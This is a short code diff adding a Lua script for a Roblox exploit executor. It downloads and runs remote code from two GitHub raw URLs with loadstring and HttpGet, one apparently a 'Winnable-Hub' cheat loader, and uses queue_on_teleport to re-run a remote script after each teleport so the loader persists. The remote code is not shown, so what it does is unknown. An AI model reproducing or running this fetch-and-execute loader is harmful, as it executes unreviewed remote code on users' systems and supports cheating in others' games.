@@ -1,0 +1,10 @@
+local scriptUrl = "https://raw.githubusercontent.com/Fujiokada/Sandbox/refs/heads/main/test"
+local queueScript = ("loadstring(game:HttpGet('%s'))()"):format(scriptUrl)
+
+if queue_on_teleport then
+    queue_on_teleport(queueScript)
+end
+
+print("Script started.")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Winnable-Hub/Loader/refs/heads/main/Loader.Lua"))()
